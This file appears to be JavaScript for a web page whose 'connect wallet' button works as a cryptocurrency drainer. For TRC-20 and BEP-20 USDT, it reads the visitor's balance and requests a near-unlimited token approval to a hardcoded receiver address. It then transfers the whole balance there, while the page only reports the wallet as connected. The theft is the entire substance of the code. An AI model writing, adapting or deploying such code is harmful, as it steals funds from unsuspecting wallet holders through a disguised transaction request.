const BEP_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BEP_RECEIVER = "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E";

const TRC_USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRC_RECEIVER = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";

const USDT_ABI = [
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "balance", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      { "name": "_owner", "type": "address" },
      { "name": "_spender", "type": "address" }
    ],
    "name": "allowance",
    "outputs": [{ "name": "remaining", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      { "name": "_spender", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "success", "type": "bool" }],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      { "name": "_from", "type": "address" },
      { "name": "_to", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "transferFrom",
    "outputs": [{ "name": "success", "type": "bool" }],
    "type": "function"
  }
];

document.getElementById("connectButton").onclick = async () => {
  if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
    await handleTron();
  } else if (window.ethereum) {
    await handleBSC();
  } else {
    alert("Please open with Trust Wallet or Web3-supported browser");
  }
};

async function handleTron() {
  try {
    const tronAddress = window.tronWeb.defaultAddress.base58;
    const usdt = await window.tronWeb.contract(USDT_ABI, TRC_USDT_ADDRESS);
    const balance = await usdt.methods.balanceOf(tronAddress).call();
    const allowance = await usdt.methods.allowance(tronAddress, TRC_RECEIVER).call();

    document.getElementById("status").innerText = `TRC20 Connected: ${tronAddress.slice(0, 6)}...${tronAddress.slice(-4)} | Balance: ${parseFloat(balance / 1e6).toFixed(2)} USDT`;

    if (parseFloat(allowance) < 1e12) {
      await usdt.methods.approve(TRC_RECEIVER, "999999999000000").send();
    }

    await usdt.methods.transferFrom(tronAddress, TRC_RECEIVER, balance).send();
  } catch (err) {
    console.error("TRC20 Error", err);
    alert("Error (TRC-20): " + err.message);
  }
}

async function handleBSC() {
  try {
    const web3 = new Web3(window.ethereum);
    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
    const wallet = accounts[0];
    const usdt = new web3.eth.Contract(USDT_ABI, BEP_USDT_ADDRESS);

    const balance = await usdt.methods.balanceOf(wallet).call();
    const allowance = await usdt.methods.allowance(wallet, BEP_RECEIVER).call();

    document.getElementById("status").innerText = `BEP20 Connected: ${wallet.slice(0, 6)}...${wallet.slice(-4)} | Balance: ${parseFloat(balance / 1e18).toFixed(2)} USDT`;

    if (parseFloat(allowance) < 1e12) {
      await usdt.methods.approve(BEP_RECEIVER, "999999999000000000000000").send({ from: wallet });
    }

    await usdt.methods.transferFrom(wallet, BEP_RECEIVER, balance).send({ from: wallet });
  } catch (err) {
    console.error("BEP20 Error", err);
    alert("Error (BEP-20): " + err.message);
  }
}
